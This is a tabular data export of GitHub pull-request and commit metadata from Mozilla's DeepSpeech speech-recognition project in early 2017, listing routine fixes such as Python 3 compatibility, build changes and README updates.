3866,https://api.github.com/repos/mozilla/DeepSpeech/pulls/469,469,Update run-ted.sh with hyperparameters from run-wer-automation.sh,Fixes #255 ,reuben,477142,2017-03-28T13:31:43Z,MEMBER,True,4,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9330f51be7f3119ca0c8fe01369b6771fd2e61c9,Update run-ted.sh with hyperparameters from run-wer-automation.sh
3867,https://api.github.com/repos/mozilla/DeepSpeech/pulls/468,468,Replace sox_open_memstream_write() for OS-X. Fixes issue #461,,Cwiiis,668518,2017-03-28T07:36:34Z,CONTRIBUTOR,True,28,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,944c3e585b9d010425a23a962b72b4dbe91f2a1d,Replace sox_open_memstream_write() for OS-X. Fixes issue #461
3868,https://api.github.com/repos/mozilla/DeepSpeech/pulls/466,466,update requirement.txt file path,Its now in root,saurabhvyas,6899784,2017-03-27T11:21:06Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ed55491ef8e63cf7a09a19c72966abb34d9cfdc9,"update requirement.txt file path

Its now in root"
3869,https://api.github.com/repos/mozilla/DeepSpeech/pulls/465,465,Allow for running under Python 3.6,"These are just mechanical/trivial changes to enable the first demo (ldc93s1) to run to completion under Python 3.6 (on Linux) as I wanted to see how it ran.

In theory we could do something smarter with the git revision and branch extraction, as currently we use a latin-1 decode (rather than the system native encoding) to get them to unicode form. Most of the rest of the changes are using modern prints and do a few list() calls around things that produce iterators under Python 3.x",mcfletch,476378,2017-03-27T05:13:53Z,CONTRIBUTOR,True,170,136,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5428880151e4b4aec5196e3767246eb14f4bd234,Trivial conversions to allow the scripts to run on virtualenv-local python (e.g. 3.6)
3870,https://api.github.com/repos/mozilla/DeepSpeech/pulls/465,465,Allow for running under Python 3.6,"These are just mechanical/trivial changes to enable the first demo (ldc93s1) to run to completion under Python 3.6 (on Linux) as I wanted to see how it ran.

In theory we could do something smarter with the git revision and branch extraction, as currently we use a latin-1 decode (rather than the system native encoding) to get them to unicode form. Most of the rest of the changes are using modern prints and do a few list() calls around things that produce iterators under Python 3.x",mcfletch,476378,2017-03-27T05:13:53Z,CONTRIBUTOR,True,170,136,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,288bd64a53613a5c97dc3fd0a5b854cac367cd4b,Conversions to modern print statements
3871,https://api.github.com/repos/mozilla/DeepSpeech/pulls/465,465,Allow for running under Python 3.6,"These are just mechanical/trivial changes to enable the first demo (ldc93s1) to run to completion under Python 3.6 (on Linux) as I wanted to see how it ran.

In theory we could do something smarter with the git revision and branch extraction, as currently we use a latin-1 decode (rather than the system native encoding) to get them to unicode form. Most of the rest of the changes are using modern prints and do a few list() calls around things that produce iterators under Python 3.x",mcfletch,476378,2017-03-27T05:13:53Z,CONTRIBUTOR,True,170,136,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b0f9893a7d63966d8293dad0365eb8fceca6c046,Use relative imports for sibling modules
3872,https://api.github.com/repos/mozilla/DeepSpeech/pulls/465,465,Allow for running under Python 3.6,"These are just mechanical/trivial changes to enable the first demo (ldc93s1) to run to completion under Python 3.6 (on Linux) as I wanted to see how it ran.

In theory we could do something smarter with the git revision and branch extraction, as currently we use a latin-1 decode (rather than the system native encoding) to get them to unicode form. Most of the rest of the changes are using modern prints and do a few list() calls around things that produce iterators under Python 3.x",mcfletch,476378,2017-03-27T05:13:53Z,CONTRIBUTOR,True,170,136,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bae4989660fcdda593f4a4daf9586f0eb27cea49,Further fixes to get the initial test run to finish
3873,https://api.github.com/repos/mozilla/DeepSpeech/pulls/465,465,Allow for running under Python 3.6,"These are just mechanical/trivial changes to enable the first demo (ldc93s1) to run to completion under Python 3.6 (on Linux) as I wanted to see how it ran.

In theory we could do something smarter with the git revision and branch extraction, as currently we use a latin-1 decode (rather than the system native encoding) to get them to unicode form. Most of the rest of the changes are using modern prints and do a few list() calls around things that produce iterators under Python 3.x",mcfletch,476378,2017-03-27T05:13:53Z,CONTRIBUTOR,True,170,136,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,433ce12c21e07a783931c7087c565ece01af7d7a,Pull the future updates up and together
3874,https://api.github.com/repos/mozilla/DeepSpeech/pulls/465,465,Allow for running under Python 3.6,"These are just mechanical/trivial changes to enable the first demo (ldc93s1) to run to completion under Python 3.6 (on Linux) as I wanted to see how it ran.

In theory we could do something smarter with the git revision and branch extraction, as currently we use a latin-1 decode (rather than the system native encoding) to get them to unicode form. Most of the rest of the changes are using modern prints and do a few list() calls around things that produce iterators under Python 3.x",mcfletch,476378,2017-03-27T05:13:53Z,CONTRIBUTOR,True,170,136,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b89895c9a46f24e55eff11d6d4362f1357538458,Add six as a dependency
3875,https://api.github.com/repos/mozilla/DeepSpeech/pulls/465,465,Allow for running under Python 3.6,"These are just mechanical/trivial changes to enable the first demo (ldc93s1) to run to completion under Python 3.6 (on Linux) as I wanted to see how it ran.

In theory we could do something smarter with the git revision and branch extraction, as currently we use a latin-1 decode (rather than the system native encoding) to get them to unicode form. Most of the rest of the changes are using modern prints and do a few list() calls around things that produce iterators under Python 3.x",mcfletch,476378,2017-03-27T05:13:53Z,CONTRIBUTOR,True,170,136,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e2572913b88a58e9214b0a80ac3691f2f7c84df2,"Another bit of python3 compatibility, this time for librivox importer"
3876,https://api.github.com/repos/mozilla/DeepSpeech/pulls/465,465,Allow for running under Python 3.6,"These are just mechanical/trivial changes to enable the first demo (ldc93s1) to run to completion under Python 3.6 (on Linux) as I wanted to see how it ran.

In theory we could do something smarter with the git revision and branch extraction, as currently we use a latin-1 decode (rather than the system native encoding) to get them to unicode form. Most of the rest of the changes are using modern prints and do a few list() calls around things that produce iterators under Python 3.x",mcfletch,476378,2017-03-27T05:13:53Z,CONTRIBUTOR,True,170,136,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc1b05f9eeb26ab48685708c02b893137d0660d8,Fix some indentation so that pylint etc. will shut up about the files
3877,https://api.github.com/repos/mozilla/DeepSpeech/pulls/465,465,Allow for running under Python 3.6,"These are just mechanical/trivial changes to enable the first demo (ldc93s1) to run to completion under Python 3.6 (on Linux) as I wanted to see how it ran.

In theory we could do something smarter with the git revision and branch extraction, as currently we use a latin-1 decode (rather than the system native encoding) to get them to unicode form. Most of the rest of the changes are using modern prints and do a few list() calls around things that produce iterators under Python 3.x",mcfletch,476378,2017-03-27T05:13:53Z,CONTRIBUTOR,True,170,136,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,efd3b880611389a91e672eea602b6c333074f563,Tell the user where the data has to be for librivox *and* warn them how big the download will be
3878,https://api.github.com/repos/mozilla/DeepSpeech/pulls/465,465,Allow for running under Python 3.6,"These are just mechanical/trivial changes to enable the first demo (ldc93s1) to run to completion under Python 3.6 (on Linux) as I wanted to see how it ran.

In theory we could do something smarter with the git revision and branch extraction, as currently we use a latin-1 decode (rather than the system native encoding) to get them to unicode form. Most of the rest of the changes are using modern prints and do a few list() calls around things that produce iterators under Python 3.x",mcfletch,476378,2017-03-27T05:13:53Z,CONTRIBUTOR,True,170,136,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2e87ab6c13376cf90fb29e0649178ffb722b86d3,Implement Reuben's changes from pull request #465
3879,https://api.github.com/repos/mozilla/DeepSpeech/pulls/462,462,Fixed #460,"@Cwiiis if you can think of a more elegant way to do this, I'm all ears.",kdavis-mozilla,12054740,2017-03-25T17:34:13Z,CONTRIBUTOR,True,7,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a93be68e2f553825a22a162712de05407a2023e1,Fixed #460
3880,https://api.github.com/repos/mozilla/DeepSpeech/pulls/462,462,Fixed #460,"@Cwiiis if you can think of a more elegant way to do this, I'm all ears.",kdavis-mozilla,12054740,2017-03-25T17:34:13Z,CONTRIBUTOR,True,7,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7ea0915ba50f1b9f7b16f6fbd9df28ddc97b5894,Addressed review comment
3881,https://api.github.com/repos/mozilla/DeepSpeech/pulls/458,458,Fix possible NULL deref on result->string,Fixes #457,lissyx,1645737,2017-03-23T13:01:41Z,COLLABORATOR,True,7,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f20251cd178a59cd77f7a737d7576e9d6b1e6e37,"Fix possible NULL deref on result->string

Fixes #457"
3882,https://api.github.com/repos/mozilla/DeepSpeech/pulls/455,455,Measure execution time in native_client,Fixes #450,lissyx,1645737,2017-03-22T18:24:32Z,COLLABORATOR,True,57,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7900d28662b2fb9cc11b5682adb819862bb64866,"Measure execution time in native_client

Fixes #450"
3883,https://api.github.com/repos/mozilla/DeepSpeech/pulls/454,454,Fix libaries ordering for linker,Fixes #453,lissyx,1645737,2017-03-22T16:21:23Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc1c85ea4626a0480eaf2cd377b75ccdbe574e37,"Fix libaries ordering for linker

Fixes #453"
3884,https://api.github.com/repos/mozilla/DeepSpeech/pulls/452,452,Support RPi toolchain cross-compilation of native client,Fixes #451,lissyx,1645737,2017-03-22T14:13:07Z,COLLABORATOR,True,44,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bf588211c590b19669e49334838aef8fe30dcbf2,"Support RPi toolchain cross-compilation of native client

Fixes #451"
3885,https://api.github.com/repos/mozilla/DeepSpeech/pulls/449,449,Separate libdeepspeech/c_speech_features/kissfft library builds,"Build separate libraries for kissfft, c_speech_features and libdeepspeech.
This allows us to specify c99 for c_speech_features and should fix
issue #441.",Cwiiis,668518,2017-03-22T11:55:50Z,CONTRIBUTOR,True,23,13,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,910a664aa86e87e93dc8fa8472bce19c012bfd44,"Separate libdeepspeech/c_speech_features/kissfft library builds

Build separate libraries for kissfft, c_speech_features and libdeepspeech.
This allows us to specify c99 for c_speech_features and should fix
issue #441."
3886,https://api.github.com/repos/mozilla/DeepSpeech/pulls/448,448,librivox status bars ,"Ref #445. 

Per @kdavis-mozilla  and @reuben , I've included status bars to display the various stages of acquisition and preprocessing of the librivox data set.   They update their ETAs adaptively based on how long it took the previous stage to complete.

I've also organized imports and made other PEP-8 related changes (largely because PyCharm does such things effectively for free). 

Finally, i have added a purposefully incomplete `requirements.txt` to the project.  It omits `tensorflow`, since it's ambiguous with `tensorflow-gpu`. ",gvoysey,3641839,2017-03-21T17:46:23Z,CONTRIBUTOR,True,112,63,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6aa353aa0cf2843d8244e3fe4fc79bdf3efbcc05,added incomplete requirements.txt.  Omitted tensorflow since it is ambiguous with tensorflow-gpu.
3887,https://api.github.com/repos/mozilla/DeepSpeech/pulls/448,448,librivox status bars ,"Ref #445. 

Per @kdavis-mozilla  and @reuben , I've included status bars to display the various stages of acquisition and preprocessing of the librivox data set.   They update their ETAs adaptively based on how long it took the previous stage to complete.

I've also organized imports and made other PEP-8 related changes (largely because PyCharm does such things effectively for free). 

Finally, i have added a purposefully incomplete `requirements.txt` to the project.  It omits `tensorflow`, since it's ambiguous with `tensorflow-gpu`. ",gvoysey,3641839,2017-03-21T17:46:23Z,CONTRIBUTOR,True,112,63,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5b88cd093deb16a7dff8309abc5c25c9781293c,refactored librivox.py for PEP8 compliance and use of informative progress bars to display actions taken during initial creation of the data set to the user.
3888,https://api.github.com/repos/mozilla/DeepSpeech/pulls/448,448,librivox status bars ,"Ref #445. 

Per @kdavis-mozilla  and @reuben , I've included status bars to display the various stages of acquisition and preprocessing of the librivox data set.   They update their ETAs adaptively based on how long it took the previous stage to complete.

I've also organized imports and made other PEP-8 related changes (largely because PyCharm does such things effectively for free). 

Finally, i have added a purposefully incomplete `requirements.txt` to the project.  It omits `tensorflow`, since it's ambiguous with `tensorflow-gpu`. ",gvoysey,3641839,2017-03-21T17:46:23Z,CONTRIBUTOR,True,112,63,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5bf7787136091fa8ed9628b97a10148c6f6ae8c6,properly formatting display status bars
3889,https://api.github.com/repos/mozilla/DeepSpeech/pulls/448,448,librivox status bars ,"Ref #445. 

Per @kdavis-mozilla  and @reuben , I've included status bars to display the various stages of acquisition and preprocessing of the librivox data set.   They update their ETAs adaptively based on how long it took the previous stage to complete.

I've also organized imports and made other PEP-8 related changes (largely because PyCharm does such things effectively for free). 

Finally, i have added a purposefully incomplete `requirements.txt` to the project.  It omits `tensorflow`, since it's ambiguous with `tensorflow-gpu`. ",gvoysey,3641839,2017-03-21T17:46:23Z,CONTRIBUTOR,True,112,63,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,388d04beab32b8654f11bb31071b4fec69c26b0b,updated requirements.txt and moved to project root
3890,https://api.github.com/repos/mozilla/DeepSpeech/pulls/446,446,Update DeepSpeech.py,"If training happened till 5th epoch then checkpoint file saved as ""model-4"". Hence start_epoch should be value 5 else 4th epoch checkpoint will be overwritten.",bikramjitroy,15829753,2017-03-18T07:57:35Z,NONE,False,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a4d3f9450ff9f8ef83142bc8a2dd569849524433,"Update DeepSpeech.py

If training happened till 5th epoch then checkpoint file saved as ""model-4"". Hence start_epoch should be value 5 else 4th epoch checkpoint will be overwritten."
3891,https://api.github.com/repos/mozilla/DeepSpeech/pulls/443,443,Fixed #440,This is a near term solution. For a longer term I've introduced issue #442 ,kdavis-mozilla,12054740,2017-03-14T14:36:07Z,CONTRIBUTOR,False,0,12,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,82ee21d38382d4b7ccdf10b01242f20e5de162e4,Fixed #440
3892,https://api.github.com/repos/mozilla/DeepSpeech/pulls/439,439,Fixed #438,,kdavis-mozilla,12054740,2017-03-12T10:25:11Z,CONTRIBUTOR,True,6,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa2009fd113a04072c3289ad320c1e3945ac7590,Fixed #438
3893,https://api.github.com/repos/mozilla/DeepSpeech/pulls/439,439,Fixed #438,,kdavis-mozilla,12054740,2017-03-12T10:25:11Z,CONTRIBUTOR,True,6,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc68ba6f145b78feb3ca53917b47754e725784d7,Addressed review comment
3894,https://api.github.com/repos/mozilla/DeepSpeech/pulls/431,431,Fixed #406,,kdavis-mozilla,12054740,2017-03-10T06:28:52Z,CONTRIBUTOR,True,11,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de45b40d8e30a67ddb2b6f6b5c2361b249a2e8e4,Fixed #406
3895,https://api.github.com/repos/mozilla/DeepSpeech/pulls/429,429,Fixed #428,,kdavis-mozilla,12054740,2017-03-08T16:25:01Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7fa0238dac2528f34526a93216d4a69f3593d3cd,Fixed #428
3896,https://api.github.com/repos/mozilla/DeepSpeech/pulls/427,427,Clean up some imports,,reuben,477142,2017-03-08T11:32:02Z,MEMBER,True,13,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d2ee957eedaf5045f9e3a5d2fd9fc866ebe2ddb,Use tf.contrib.rnn instead of tf.contrib.rnn.python.ops.core_rnn_cell
3897,https://api.github.com/repos/mozilla/DeepSpeech/pulls/427,427,Clean up some imports,,reuben,477142,2017-03-08T11:32:02Z,MEMBER,True,13,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cad1dc28fba128145102cb4042b8c26210911f93,Use tf.nn instead of tf.python.ops.ctc_ops
3898,https://api.github.com/repos/mozilla/DeepSpeech/pulls/427,427,Clean up some imports,,reuben,477142,2017-03-08T11:32:02Z,MEMBER,True,13,15,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cf9b1f1bed65402d351e97fe3c56c77c3d022692,Remove leftover ctc_ops use
3899,https://api.github.com/repos/mozilla/DeepSpeech/pulls/426,426,Fixed #424,,kdavis-mozilla,12054740,2017-03-08T10:15:40Z,CONTRIBUTOR,True,6,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f639c16d9eb20f173cba7b5e55ab3d88fcd139ac,Fixed #424
3900,https://api.github.com/repos/mozilla/DeepSpeech/pulls/426,426,Fixed #424,,kdavis-mozilla,12054740,2017-03-08T10:15:40Z,CONTRIBUTOR,True,6,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27201bbe3f118a323dfc326dc7ca0e152b0f997f,Addressed review comments
3901,https://api.github.com/repos/mozilla/DeepSpeech/pulls/425,425,Update DeepSpeech.py,fixed homophone typo.,gvoysey,3641839,2017-03-07T20:55:15Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d0855b4b8b32e37a72e1cdacfd022202f72020a,"Update DeepSpeech.py

fixed homophone typo."
3902,https://api.github.com/repos/mozilla/DeepSpeech/pulls/421,421,Fixed #412,,kdavis-mozilla,12054740,2017-03-07T16:29:10Z,CONTRIBUTOR,True,6,5,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4765953b99416e551438d384d6c273f9f91354a7,Fixed #412
3903,https://api.github.com/repos/mozilla/DeepSpeech/pulls/420,420,Extended number of epochs,,kdavis-mozilla,12054740,2017-03-06T07:16:48Z,CONTRIBUTOR,True,12,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,12ccdfcac4e9d4528a7bbc4d07d7c4539026100d,better README.md
3904,https://api.github.com/repos/mozilla/DeepSpeech/pulls/420,420,Extended number of epochs,,kdavis-mozilla,12054740,2017-03-06T07:16:48Z,CONTRIBUTOR,True,12,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d399fad9d510ec659d9facc54e4035fa25d29837,ammended https://github.com/kpu/kenlm/archive/master.zip
3905,https://api.github.com/repos/mozilla/DeepSpeech/pulls/420,420,Extended number of epochs,,kdavis-mozilla,12054740,2017-03-06T07:16:48Z,CONTRIBUTOR,True,12,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f46b5b5e75befa36ac431edcf58943734a6c7790,removed sudo
3906,https://api.github.com/repos/mozilla/DeepSpeech/pulls/420,420,Extended number of epochs,,kdavis-mozilla,12054740,2017-03-06T07:16:48Z,CONTRIBUTOR,True,12,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5eb9d73da17b39574a5b234dfa67b43e9a433c91,"Merge pull request #414 from pannous/master

better README.md"
3907,https://api.github.com/repos/mozilla/DeepSpeech/pulls/420,420,Extended number of epochs,,kdavis-mozilla,12054740,2017-03-06T07:16:48Z,CONTRIBUTOR,True,12,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3b840625fdc3c37a11a850bfc02a578466a912cd,Fixed #418
3908,https://api.github.com/repos/mozilla/DeepSpeech/pulls/420,420,Extended number of epochs,,kdavis-mozilla,12054740,2017-03-06T07:16:48Z,CONTRIBUTOR,True,12,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8f9b22628bb1e23b15cdef4e581ae4debb2ceaf,"Merge pull request #419 from mozilla/issue418

Fixed #418"
3909,https://api.github.com/repos/mozilla/DeepSpeech/pulls/419,419,Fixed #418,,kdavis-mozilla,12054740,2017-03-06T07:07:52Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3b840625fdc3c37a11a850bfc02a578466a912cd,Fixed #418
3910,https://api.github.com/repos/mozilla/DeepSpeech/pulls/415,415,Don't retrain the last epoch after restoring from a checkpoint,,reuben,477142,2017-03-01T19:27:14Z,MEMBER,False,6,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2fc3ff08ec5b1c11ba3c409c93871cf7b501756d,Don't retrain the last epoch after restoring from a checkpoint
3911,https://api.github.com/repos/mozilla/DeepSpeech/pulls/414,414,better README.md,,pannous,516118,2017-02-28T13:57:47Z,CONTRIBUTOR,True,11,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,12ccdfcac4e9d4528a7bbc4d07d7c4539026100d,better README.md
3912,https://api.github.com/repos/mozilla/DeepSpeech/pulls/414,414,better README.md,,pannous,516118,2017-02-28T13:57:47Z,CONTRIBUTOR,True,11,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d399fad9d510ec659d9facc54e4035fa25d29837,ammended https://github.com/kpu/kenlm/archive/master.zip
3913,https://api.github.com/repos/mozilla/DeepSpeech/pulls/414,414,better README.md,,pannous,516118,2017-02-28T13:57:47Z,CONTRIBUTOR,True,11,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f46b5b5e75befa36ac431edcf58943734a6c7790,removed sudo
3914,https://api.github.com/repos/mozilla/DeepSpeech/pulls/413,413,Simplified getting started,added requirements.txt and better Readme,pannous,516118,2017-02-28T13:06:52Z,CONTRIBUTOR,False,16,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3235d525cdb12bbbfb494eb6bb550ced9604b0da,added requirements.txt
3915,https://api.github.com/repos/mozilla/DeepSpeech/pulls/413,413,Simplified getting started,added requirements.txt and better Readme,pannous,516118,2017-02-28T13:06:52Z,CONTRIBUTOR,False,16,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48870c73e7b97f6e1fe12636608f642860a01b34,''
3916,https://api.github.com/repos/mozilla/DeepSpeech/pulls/413,413,Simplified getting started,added requirements.txt and better Readme,pannous,516118,2017-02-28T13:06:52Z,CONTRIBUTOR,False,16,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6b05086fd9605bea247057fac4159283b0e3452a,''
3917,https://api.github.com/repos/mozilla/DeepSpeech/pulls/413,413,Simplified getting started,added requirements.txt and better Readme,pannous,516118,2017-02-28T13:06:52Z,CONTRIBUTOR,False,16,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f99270c3d18733544bd7ff17dbd05b043e17df5,''
3918,https://api.github.com/repos/mozilla/DeepSpeech/pulls/413,413,Simplified getting started,added requirements.txt and better Readme,pannous,516118,2017-02-28T13:06:52Z,CONTRIBUTOR,False,16,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,55f7e281a0123f6063a4deff8d5b5fbf10bdee90,improved README.md
3919,https://api.github.com/repos/mozilla/DeepSpeech/pulls/405,405,Merge wer,,lissyx,1645737,2017-02-24T11:14:42Z,COLLABORATOR,True,5754,12,52,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9cfba5ed6b015611af5c884401aed8d1e576ab1c,Fixed #398
3920,https://api.github.com/repos/mozilla/DeepSpeech/pulls/405,405,Merge wer,,lissyx,1645737,2017-02-24T11:14:42Z,COLLABORATOR,True,5754,12,52,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b876f6f20f5f52980dd9e0614bc8a0d0804e82d9,"Merge pull request #401 from mozilla/issue398

Fixed #398"
3921,https://api.github.com/repos/mozilla/DeepSpeech/pulls/405,405,Merge wer,,lissyx,1645737,2017-02-24T11:14:42Z,COLLABORATOR,True,5754,12,52,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2740336d089b592f905e0236a686aa71096dd28f,Implement a native client using TensorFlow C API
3922,https://api.github.com/repos/mozilla/DeepSpeech/pulls/405,405,Merge wer,,lissyx,1645737,2017-02-24T11:14:42Z,COLLABORATOR,True,5754,12,52,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7ebabea7a09c830fc56e5e52b1b9542b1bf13fa7,"Merge pull request #380 from Cwiiis/issue-379-native-client

Implement a native client using TensorFlow C API, Issue #379"
3923,https://api.github.com/repos/mozilla/DeepSpeech/pulls/405,405,Merge wer,,lissyx,1645737,2017-02-24T11:14:42Z,COLLABORATOR,True,5754,12,52,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f931272986b1a62f2cd2b555a5ad495093823f9,Fixed #403
3924,https://api.github.com/repos/mozilla/DeepSpeech/pulls/405,405,Merge wer,,lissyx,1645737,2017-02-24T11:14:42Z,COLLABORATOR,True,5754,12,52,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,81ec49d627b306b88761e2483d4826be30a3b824,"Merge pull request #404 from mozilla/issue403

Fixed #403"
3925,https://api.github.com/repos/mozilla/DeepSpeech/pulls/405,405,Merge wer,,lissyx,1645737,2017-02-24T11:14:42Z,COLLABORATOR,True,5754,12,52,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c8b87044fda02d109a2be3491cc6efa7ea4aeeef,Merge remote-tracking branch 'upstream/master' into merge_wer
